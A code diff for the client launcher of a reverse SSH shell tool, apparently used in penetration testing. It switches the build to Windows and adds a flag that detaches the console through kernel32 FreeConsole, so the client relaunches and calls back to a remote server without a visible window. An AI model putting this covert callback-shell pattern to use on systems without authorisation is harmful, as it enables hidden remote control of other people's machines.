@@ -1,5 +1,5 @@
-//go:build !windows
-// +build !windows
+//go:build windows
+// +build windows
 
 package main
 
@@ -10,6 +10,8 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
+	"syscall"
 
 	"github.com/NHAS/reverse_ssh/internal/client"
 )
@@ -29,6 +31,7 @@ func main() {
 
 	flag.Bool("foreground", false, "Dont fork to background on start")
 	flag.Bool("reconnect", true, "Auto reconnect on disconnection")
+	flag.Bool("detach", true, "(windows only) will force a console detach")
 	proxyAddress := flag.String("proxy", "", "Sets the HTTP_PROXY enviroment variable so the net library will use it")
 	fingerprint := flag.String("fingerprint", "", "Server public key fingerprint")
 
@@ -36,7 +39,7 @@ func main() {
 
 	flag.Parse()
 
-	var fg, rc bool
+	var fg, rc, dt bool
 
 	flag.Visit(func(f *flag.Flag) {
 		switch f.Name {
@@ -44,6 +47,8 @@ func main() {
 			rc = true
 		case "foreground":
 			fg = true
+		case "detach":
+			dt = true
 		}
 	})
 
@@ -57,12 +62,21 @@ func main() {
 		destination = flag.Arg(0)
 	}
 
-	if fg {
+	if fg || dt {
+		if dt {
+			modkernel32 := syscall.NewLazyDLL("kernel32.dll")
+			procAttachConsole := modkernel32.NewProc("FreeConsole")
+			syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)
+		}
 		client.Run(destination, *fingerprint, *proxyAddress, rc)
 		return
 	}
 
-	cmd := exec.Command(os.Args[0], append([]string{"--foreground"}, os.Args[1:]...)...)
+	newArgs := append([]string{"--foreground"}, os.Args[1:]...)
+	if runtime.GOOS == "windows" {
+		newArgs[0] = "--detach" // will trigger a detach
+	}
+	cmd := exec.Command(os.Args[0], newArgs...)
 	cmd.Start()
 	log.Println("Ending parent")
 }
